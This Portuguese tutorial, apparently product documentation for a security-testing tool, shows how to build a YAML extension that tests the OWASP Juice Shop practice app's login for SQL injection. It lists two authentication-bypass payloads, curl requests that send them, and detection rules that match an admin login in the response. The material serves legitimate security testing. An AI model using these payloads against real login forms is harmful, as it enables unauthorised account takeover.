[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md#working-with-the-host-header
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project




#   Criação de Extensão Não Modificadora

A extensão descrita neste documento não modificará uma solicitação inicial para injetar algum payload. Em vez disso, as duas solicitações de teste pré-definidas serão enviadas ao host que é especificado na solicitação inicial. Essas solicitações de teste contêm payloads que podem levar à exploração da vulnerabilidade SQLi no formulário de login do aplicativo alvo [“OWASP Juice Shop”][link-juice-shop].


##  Preparativos

É altamente recomendado [investigar o comportamento do aplicativo alvo][link-app-examination] antes da criação da extensão FAST.


##  Construindo a Extensão

Crie um arquivo que descreva a extensão (por exemplo, `non-mod-extension.yaml`) e preencha-o com as seções necessárias:

1.  [**A seção `meta-info`**][link-meta-info].

    Prepare a descrição da vulnerabilidade que a extensão tentará detectar.
    
    * cabeçalho da vulnerabilidade: `OWASP Juice Shop SQLi (extensão não modificadora)`
    * descrição da vulnerabilidade: `Demonstração de SQLi na OWASP Juice Shop (Login de Administrador)`
    * tipo de vulnerabilidade: Injeção SQL
    * nível de ameaça da vulnerabilidade: alto
    
    A seção `meta-info` correspondente deve ser assim:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (extensão não modificadora)'
      - description: 'Demonstração de SQLi na OWASP Juice Shop (Login de Administrador)'
    ```
    
2.  **A seção `enviar`, a [fase Enviar][doc-send-phase]**

    Há dois payloads que devem ser enviados como valor do parâmetro `email` junto com qualquer valor `password` para explorar a vulnerabilidade de injeção de SQL no aplicativo de destino:
    
    * `'ou 1=1 --`
    * `admin@juice-sh.op'--`
    
    Você pode criar duas solicitações de teste, cada uma contendo
    
    * o parâmetro `email` com um dos valores descritos acima e 
    * o parâmetro `password` com um valor arbitrário.

    É suficiente usar apenas uma dessas solicitações para testar nosso aplicativo de exemplo (OWASP Juice Shop).
    
    No entanto, ter um conjunto de várias solicitações de teste preparadas pode ser útil ao realizar o teste de segurança de um aplicativo real: se uma das solicitações não conseguir explorar uma vulnerabilidade graças a atualizações e melhorias no aplicativo, ainda haverá outras solicitações de teste disponíveis que podem continuar a explorar a vulnerabilidade devido a outros payloads em uso.

    A solicitação com o primeiro payload da lista acima é semelhante a esta:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    A segunda solicitação se assemelha à primeira:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    Adicione a seção `enviar` contendo as descrições dessas duas solicitações de teste:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ```  
    
    !!! info "Uma nota sobre o cabeçalho `Host`" 
        O cabeçalho `Host` pode ser omitido nessas solicitações porque não influencia a exploração desta vulnerabilidade SQLi em particular. Um nó FAST adicionará automaticamente o cabeçalho `Host` extraído das solicitações iniciais.
        
        Leia [aqui][link-send-headers] sobre como a fase Enviar manipula os cabeçalhos das solicitações.

     3.  **A seção `detectar`, a [fase Detectar][doc-detect-phase]**.
    
    As seguintes condições indicam que a autenticação do usuário com direitos de administrador foi bem-sucedida:
    
    * A presença do identificador do carrinho de compras com o valor `1` no corpo da resposta. O parâmetro está no formato JSON e deve parecer com isto:
    
        ```
        "bid":1
        ```
    
    * A presença do parâmetro de email do usuário com o valor `admin@juice-sh.op` no corpo da resposta. O parâmetro está no formato JSON e deve parecer com isto:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Adicione a seção `detectar` que verifica se o ataque foi bem-sucedido de acordo com as condições descritas acima.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Escapando os símbolos especiais"
    Lembre-se de escapar os símbolos especiais nas strings.

##  Arquivo de Extensão

Agora o arquivo `non-mod-extension.yaml` contém um conjunto completo das seções necessárias para a operação da extensão. A lista do conteúdo do arquivo é mostrada abaixo:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (extensão não modificadora)'
      - description: 'Demonstração de SQLi na OWASP Juice Shop (Login de Administrador)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Usando a Extensão

Para obter informações detalhadas sobre como usar a expressão criada, leia [este documento][link-using-extension].